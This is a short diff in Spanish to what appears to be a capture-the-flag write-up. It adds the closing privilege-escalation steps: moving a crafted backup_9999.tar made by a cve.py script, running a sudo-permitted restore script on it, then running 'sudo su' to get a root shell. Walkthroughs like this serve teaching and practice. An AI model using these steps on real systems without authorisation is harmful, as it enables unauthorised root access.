@@ -124,4 +124,21 @@ Lo ejecutamos con
 python3 cve.py
 ```
 
-Y nos c
+
+Y nos crea automaticamente un archivo llamdado `backup_9999.tar` movemos el nuevo archivo a
+```shell
+mv /tmp/backup_9999.tar /opt/backup_clients/backups
+```
+
+Y lo ejecutamos
+```shell
+sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_9999.tar -r restore_pwn
+```
+
+Ejecutaremos
+```shell
+sudo su
+```
+
+Y obtendremos una shell como root
+
